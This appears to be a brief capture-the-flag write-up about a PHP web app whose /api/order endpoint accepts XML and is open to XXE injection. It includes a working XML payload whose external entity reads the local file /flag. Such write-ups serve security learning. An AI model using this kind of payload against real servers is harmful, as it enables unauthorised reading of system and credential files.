- provided with source code for PHP web app
- can be seen that `/api/order` endpoint is vulnerable to XXE injection whenever the `content-type` header is set to `application/xml`
- flag can be retrieved at `/flag` after trying multiple locations around the server
 
```
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///flag"> ]>
<order>
  <table_num>3</table_num>
  <food>&ent;</food>
</order>
```

#### Tags: XXE
